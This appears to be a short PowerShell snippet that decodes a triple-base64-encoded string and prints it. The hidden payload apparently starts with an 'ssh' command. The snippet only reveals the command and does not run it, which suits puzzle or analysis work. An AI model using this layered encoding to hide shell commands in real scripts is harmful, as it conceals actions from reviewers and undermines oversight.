$C = "WXpOT2IwbERNWFpKUTBwVVpFaEtjRmt6VWtsaU0wNHdVekpXTlZFeWFHeFpNblJ3WW0xaloySnRPR2xKUjJReFltNU9hRkZFYTNkTWFrVjNUMU0wZVUxNmEzVk5lazFuVEZaSlowNXFXVEpPYW5CellqSk9hR0pIYUhaak0xRTJUV3BKUFE9PQ=="

for ($i = 0; $i -lt 3; $i++) 
{ $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }

$C